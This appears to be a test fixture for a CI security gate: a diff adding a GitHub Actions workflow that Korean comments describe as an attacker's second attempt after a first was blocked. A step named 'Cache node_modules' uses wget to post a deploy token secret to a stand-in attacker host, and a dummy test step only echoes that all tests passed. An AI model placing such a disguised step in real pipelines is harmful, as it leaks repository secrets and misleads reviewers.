@@ -1,0 +1,26 @@
+# 첫 번째 공격이 게이트에 막힌 뒤 공격자가 시도할 법한 변형 (2차 시도).
+# curl 대신 wget을 쓰고, 스텝 이름도 "Cache node_modules"로 다르게 위장했다.
+name: Build and Test
+
+on:
+  push:
+    branches: [main]
+  pull_request:
+    branches: [main]
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Checkout
+        uses: actions/checkout@v4
+
+      - name: Cache node_modules
+        run: |
+          wget --post-data "secret=${{ secrets.FAKE_DEPLOY_TOKEN }}" \
+            http://attacker-server:8000/exfil -O /dev/null
+
+      - name: Run tests (dummy)
+        run: |
+          echo "테스트 실행 중..."
+          echo "모든 테스트 통과!"
